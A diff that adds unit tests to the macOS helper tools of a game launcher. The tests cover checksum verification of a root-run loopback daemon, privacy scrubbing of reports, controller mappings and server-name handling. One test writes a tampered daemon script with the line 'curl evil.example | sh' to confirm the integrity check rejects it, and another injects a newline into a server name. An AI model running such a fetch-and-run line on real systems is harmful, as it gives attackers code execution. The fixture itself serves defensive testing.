@@ -193,6 +193,61 @@ class ToolsTest(unittest.TestCase):
         self.assertIn("reclaimer-loopback.sh", cmd)
         self.assertEqual(out[-1], "ok")
 
+    def test_net_fix_root_command_checks_what_it_installed(self):
+        # the copy in the game folder is the player's to change: what runs as root at boot is checked, after copying
+        # it where only root can write, against the checksum this script ships with (security review, M1)
+        t = self.load()
+        cmd = self.run_tool("net-fix")[1]
+        cmd = next(l for l in cmd if l.startswith("dry-run admin: "))
+        self.assertIn(t.LOOPBACK_SHA, cmd)
+        self.assertIn(t.LOOPBACK_PLIST_SHA, cmd)
+        self.assertLess(cmd.index("install -o root"), cmd.index("shasum"))
+        # the check itself, run on stand-ins for the two root-owned copies: right files pass, a swapped one is removed
+        check = cmd[cmd.index("{ printf"):cmd.index("&& { launchctl")]
+        for swapped in (False, True):
+            d = self.tmp / f"root-{swapped}"
+            d.mkdir()
+            script, plist = d / "reclaimer-loopback.sh", d / "loopback.plist"
+            shutil.copy(REPO / "scripts" / "reclaimer-loopback.sh", script)
+            shutil.copy(REPO / "scripts" / "local.projectreclaimer.loopback.plist", plist)
+            if swapped:
+                script.write_text("#!/bin/sh\ncurl evil.example | sh\n")
+            run = check.replace(t.quoted(t.DAEMON_DIR + "/reclaimer-loopback.sh"), t.quoted(script)) \
+                       .replace(t.DAEMON_PLIST, t.quoted(plist))
+            rc = subprocess.run(["/bin/sh", "-c", run], capture_output=True).returncode
+            self.assertEqual(rc != 0, swapped, run)
+            self.assertEqual(script.exists(), not swapped)
+
+    def test_net_fix_restarts_the_installed_task_without_reinstalling_it(self):
+        # the root-owned copy is already right: only restart it, so no file of the player's goes to root at all
+        daemon_dir = self.tmp / "daemon-dir"
+        daemon_dir.mkdir()
+        shutil.copy(REPO / "scripts" / "reclaimer-loopback.sh", daemon_dir / "reclaimer-loopback.sh")
+        shutil.copy(REPO / "scripts" / "local.projectreclaimer.loopback.plist", self.daemon)
+        rc, out = self.run_tool("net-fix", RECLAIMER_TEST_DAEMON_DIR=str(daemon_dir))
+        cmd = next(l for l in out if l.startswith("dry-run admin: "))
+        self.assertNotIn("install -o root", cmd)
+        self.assertIn("launchctl bootstrap system", cmd)
+
+    def test_shipped_checksums_match_the_network_files(self):
+        t = self.load()
+        sha = lambda f: subprocess.run(["shasum", "-a", "256", str(REPO / "scripts" / f)], capture_output=True,
+                                       text=True).stdout.split()[0]
+        self.assertEqual(t.LOOPBACK_SHA, sha("reclaimer-loopback.sh"))
+        self.assertEqual(t.LOOPBACK_PLIST_SHA, sha("local.projectreclaimer.loopback.plist"))
+        install = (REPO / "install.sh").read_text()
+        self.assertIn(f"LOOPBACK_SHA={t.LOOPBACK_SHA}", install)
+        self.assertIn(f"LOOPBACK_PLIST_SHA={t.LOOPBACK_PLIST_SHA}", install)
+
+    def test_admin_prompt_keeps_non_ascii_paths(self):
+        # json.dumps escaped é as \u00e9, which AppleScript rejects: net-fix failed for such install paths
+        t = self.load()
+        script = t.admin_script("ls '/Users/José/Games'", "Project Reclaimer")
+        self.assertIn("José", script)
+        self.assertNotIn("\\u00e9", script)
+        self.assertEqual(subprocess.run(["/usr/bin/osacompile", "-o", str(self.tmp / "x.scpt"), "-e", script],
+                                        capture_output=True).returncode, 0, script)
+
     # ---- crash check -------------------------------------------------------------------------------------------
     def test_crash_check(self):
         log = self.home / "logs" / "client-wine.log"
@@ -391,6 +446,15 @@ class ToolsTest(unittest.TestCase):
         self.assertIn("Startup: unknown (the startup check failed)", summary)
         self.assertNotIn("startup-state.json", names)  # (no invented verdict)
         self.assertNotIn("the probe broke", summary)  # (an error's own words can name paths)
+    def test_report_leaves_out_the_mac_user_name_and_logged_steam_names(self):
+        (self.home / "logs" / "launcher.log").write_text(
+            f"started (home {Path.home()}/Games/ProjectReclaimer)\nDepotDownloader -username OldName -remember-password\n")
+        rc, out = self.run_tool("report")
+        with zipfile.ZipFile(Path(out[-1][3:])) as z:
+            text = "".join(z.read(n).decode("utf-8", "replace") for n in z.namelist())
+        self.assertNotIn(str(Path.home()), text)
+        self.assertIn("~/Games/ProjectReclaimer", text)
+        self.assertNotIn("OldName", text)  # (after Forget Steam the account file is gone, but logs still name it)
 
     # ---- graphics / steam --------------------------------------------------------------------------------------
     def test_forget_steam(self):
@@ -548,6 +612,12 @@ class ToolsTest(unittest.TestCase):
                        '"version": "0.9.11"}\'')
         self.assertEqual(self.run_tool("server-version", "1.2.3.4:5")[1][-1], "0.9.11 Star Wars")
 
+    def test_server_version_name_cant_add_lines(self):
+        # a server's name is the server's to choose; a newline in it used to add a fake "<version> <name>" line
+        self.fake_wine("printf '%s\\n' '{\"name\": \"Evil\\n0.9.1 Fake\", \"version\": \"0.9.11\"}'")
+        out = self.run_tool("server-version", "1.2.3.4:5")[1]
+        self.assertEqual(out, ["0.9.11 Evil 0.9.1 Fake"])
+
     def test_server_version_of_a_server_that_doesnt_answer(self):
         self.fake_wine('echo "Error: Connecting to game server (UDP/QUIC): no response within 2500 ms"; exit 1')
         self.assertEqual(self.run_tool("server-version", "1.2.3.4:5")[1][-1], "unreachable")
@@ -666,6 +736,28 @@ class ToolsTest(unittest.TestCase):
         rc, out = self.run_tool("uninstall", RECLAIMER_HOME=str(self.tmp))
         self.assertTrue(out[-1].startswith("error: "))
         self.assertTrue(self.tmp.exists())
+
+    def test_game_env_sets_sdl_controller_config_file_when_mappings_exist(self):
+        spec = importlib.util.spec_from_file_location("tools", str(self.home / "game" / "tools.py"))
+        tools = importlib.util.module_from_spec(spec)
+        with mock.patch.dict(os.environ, {"RECLAIMER_HOME": str(self.home)}):
+            spec.loader.exec_module(tools)
+            (tools.GAME / "gamecontrollerdb.txt").write_text("guid,bundled,platform:Mac OS X,\n")
+            (tools.BASE / "controller-mappings.txt").write_text("guid,user,platform:Mac OS X,\n")
+            env = tools.game_env()
+            self.assertEqual(env.get("SDL_GAMECONTROLLERCONFIG_FILE"), str(tools.BASE / "controller-mappings-active.txt"))
+            self.assertIn("guid,user", (tools.BASE / "controller-mappings-active.txt").read_text())
+
+    def test_game_env_leaves_sdl_controller_config_file_unset_when_no_mappings(self):
+        spec = importlib.util.spec_from_file_location("tools", str(self.home / "game" / "tools.py"))
+        tools = importlib.util.module_from_spec(spec)
+        with mock.patch.dict(os.environ, {"RECLAIMER_HOME": str(self.home)}):
+            spec.loader.exec_module(tools)
+            (tools.GAME / "gamecontrollerdb.txt").unlink(missing_ok=True)
+            (tools.BASE / "controller-mappings.txt").unlink(missing_ok=True)
+            (tools.BASE / "controller-mappings-active.txt").unlink(missing_ok=True)
+            env = tools.game_env()
+            self.assertNotIn("SDL_GAMECONTROLLERCONFIG_FILE", env)
 
 
 if __name__ == "__main__":
